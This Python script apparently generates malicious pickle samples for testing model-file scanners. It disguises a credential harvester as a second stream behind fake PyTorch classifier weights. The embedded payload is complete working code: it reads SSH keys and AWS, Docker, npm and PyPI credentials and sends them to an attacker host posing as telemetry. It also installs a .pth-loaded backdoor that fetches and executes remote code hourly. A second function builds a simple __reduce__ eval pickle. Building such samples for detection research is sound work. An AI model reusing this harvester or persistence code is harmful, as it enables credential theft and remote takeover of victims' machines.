#!/usr/bin/env python
"""
Create a contrived but realistic example of a steganographic multiple pickle stream attack.

Scenario: An attacker creates a model that appears to be a legitimate image classifier
but contains a hidden second stream with malicious code for credential harvesting.
"""

import collections
import pickle
import tempfile


def create_steganographic_attack(output_path=None):
    """Create a realistic steganographic attack using multiple pickle streams"""

    print("🎭 Creating Steganographic Multiple Stream Attack")
    print("=" * 60)
    print()
    print("📋 Attack Scenario:")
    print("   A seemingly legitimate PyTorch image classifier model")
    print("   First stream: Normal model weights (appears safe)")
    print("   Second stream: Hidden credential harvester")
    print()

    # ========================================
    # STREAM 1: Legitimate-looking model data
    # ========================================
    print("🔧 Creating Stream 1: Legitimate PyTorch Model")

    # Create convincing PyTorch state_dict structure
    legitimate_model = collections.OrderedDict(
        [
            # Typical CNN architecture for image classification
            ("features.0.weight", "<Tensor shape=(64, 3, 7, 7)>"),
            ("features.0.bias", "<Tensor shape=(64,)>"),
            ("features.3.weight", "<Tensor shape=(64, 64, 3, 3)>"),
            ("features.3.bias", "<Tensor shape=(64,)>"),
            ("features.6.weight", "<Tensor shape=(128, 64, 3, 3)>"),
            ("features.6.bias", "<Tensor shape=(128,)>"),
            ("classifier.weight", "<Tensor shape=(1000, 128)>"),
            ("classifier.bias", "<Tensor shape=(1000,)>"),
            # PyTorch metadata (makes it look authentic)
            (
                "_metadata",
                collections.OrderedDict(
                    [
                        ("version", 1),
                        ("", {"version": 1}),
                        ("features", {"version": 1}),
                        ("features.0", {"version": 1}),
                        ("features.3", {"version": 1}),
                        ("features.6", {"version": 1}),
                        ("classifier", {"version": 1}),
                    ]
                ),
            ),
        ]
    )

    stream1_bytes = pickle.dumps(legitimate_model)
    print(f"   ✅ Stream 1: {len(stream1_bytes)} bytes (legitimate PyTorch state_dict)")

    # ========================================
    # STREAM 2: Hidden malicious payload
    # ========================================
    print("🚨 Creating Stream 2: Hidden Malicious Payload")

    # Create a sophisticated credential harvester that:
    # 1. Looks for SSH keys, AWS credentials, etc.
    # 2. Exfiltrates to attacker-controlled server
    # 3. Maintains persistence
    malicious_payload = {
        # Disguised as model metadata
        "model_info": {
            "name": "ResNet-ImageNet-Classifier",
            "version": "1.0.0",
            "accuracy": 0.8547,
        },
        # The actual malicious code (this would execute during unpickling)
        "config_loader": """
import os, urllib.request, json, subprocess
from pathlib import Path

# Harvest credentials from common locations
def harvest():
    targets = [
        '~/.ssh/id_rsa', '~/.ssh/id_ed25519',  # SSH keys
        '~/.aws/credentials', '~/.aws/config',   # AWS creds  
        '~/.docker/config.json',                 # Docker registry
        '~/.npmrc', '~/.pypirc',                # Package registries
        '~/.gitconfig',                         # Git config
    ]
    
    data = {'hostname': os.uname().nodename, 'files': {}}
    for target in targets:
        try:
            path = Path(target).expanduser()
            if path.exists():
                data['files'][target] = path.read_text()[:1000]  # First 1KB
        except: pass
    
    # Exfiltrate to attacker server (disguised as model telemetry)
    try:
        req = urllib.request.Request(
            'https://model-analytics.ai-research-labs.com/v1/usage',
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json', 'User-Agent': 'PyTorch/2.0.0'}
        )
        urllib.request.urlopen(req, timeout=5)
    except: pass

# Install persistence (disguised as model caching)
def persist():
    cache_dir = Path.home() / '.pytorch' / 'model_cache'  
    cache_dir.mkdir(parents=True, exist_ok=True)
    
    backdoor = cache_dir / 'cache_manager.py'
    backdoor.write_text(\"\"\"\
import threading, time, subprocess, os
def background_update():
    while True:
        try:
            # Disguised reverse shell (looks like model update check)
            subprocess.run(['python', '-c', 'exec(__import__(\"urllib.request\").request.urlopen(\"https://model-updates.ai-research-labs.com/shell\").read())'], 
                         capture_output=True, timeout=10)
        except: pass
        time.sleep(3600)  # Every hour
        
threading.Thread(target=background_update, daemon=True).start()
\"\"\")
    
    # Add to PYTHONPATH via .pth file (auto-imported)
    import site
    for site_dir in site.getsitepackages():
        try:
            pth_file = Path(site_dir) / 'model_cache.pth'  
            pth_file.write_text(str(cache_dir))
            break
        except: continue

# Execute attack
harvest()
persist()
""",
    }

    stream2_bytes = pickle.dumps(malicious_payload)
    print(f"   ✅ Stream 2: {len(stream2_bytes)} bytes (credential harvester + persistence)")

    # ========================================
    # COMBINE STREAMS: Create the attack file
    # ========================================
    print("🔗 Combining Streams into Attack File")

    # Determine output path
    if output_path is None:
        output_path = tempfile.NamedTemporaryFile(suffix=".pkl", delete=False).name

    # Combine both streams into a single file
    with open(output_path, "wb") as f:
        f.write(stream1_bytes)  # First stream (appears legitimate)
        f.write(stream2_bytes)  # Second stream (hidden malicious)

    print(f"   ✅ Attack file created: {output_path}")
    print(f"   📏 Total size: {len(stream1_bytes) + len(stream2_bytes)} bytes")
    print(f"   📊 Stream 1: {len(stream1_bytes)} bytes (legitimate)")
    print(f"   📊 Stream 2: {len(stream2_bytes)} bytes (malicious)")

    return output_path, len(stream1_bytes), len(stream2_bytes)


def create_simple_malicious_pickle(output_path=None):
    """Create a simple malicious pickle for comparison"""

    # Simple eval-based attack
    class MaliciousPayload:
        def __reduce__(self):
            return (eval, ("__import__('os').system('echo MALICIOUS_PAYLOAD_EXECUTED')",))

    if output_path is None:
        output_path = tempfile.NamedTemporaryFile(suffix=".pkl", delete=False).name

    with open(output_path, "wb") as f:
        pickle.dump(MaliciousPayload(), f)

    return output_path


if __name__ == "__main__":
    # Create both attack types
    steg_path, stream1_size, stream2_size = create_steganographic_attack()
    simple_path = create_simple_malicious_pickle()

    print()
    print("🎉 Attack Files Generated:")
    print(f"   📁 Steganographic: {steg_path} ({stream1_size + stream2_size} bytes)")
    print(f"   📁 Simple Malicious: {simple_path}")
